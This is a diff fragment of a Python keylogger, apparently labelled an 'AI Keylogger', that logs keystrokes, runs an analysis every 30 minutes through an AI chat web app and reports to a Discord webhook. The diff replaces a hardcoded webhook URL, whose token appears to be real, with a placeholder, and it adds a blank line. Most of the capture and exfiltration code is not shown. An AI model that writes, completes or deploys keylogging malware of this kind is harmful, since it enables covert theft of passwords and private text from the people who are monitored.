@@ -16,7 +16,7 @@ class keylogger:
         self.log = ''
         self.url = 'https://www.easemate.ai/webapp/chat'
         self.report = ''
-        self.webhook_url = 'https://discord.com/api/webhooks/1480290358725443585/JZtn_-nZEvnGAyBEp07mILkXHw62hlpErRcvzaIFRQvgQNx5f8h-ogiW41LMCyEUX9i7'
+        self.webhook_url = 'Discord_Web_Hook'
 
     def storeText(self, key):
         try:
@@ -172,4 +172,5 @@ if __name__ == '__main__':
     print("[*] AI Keylogger started (analyzes every 30m)")
     print("[*] Press Ctrl+C to stop")
     newKey = keylogger()
+
     newKey.logger()
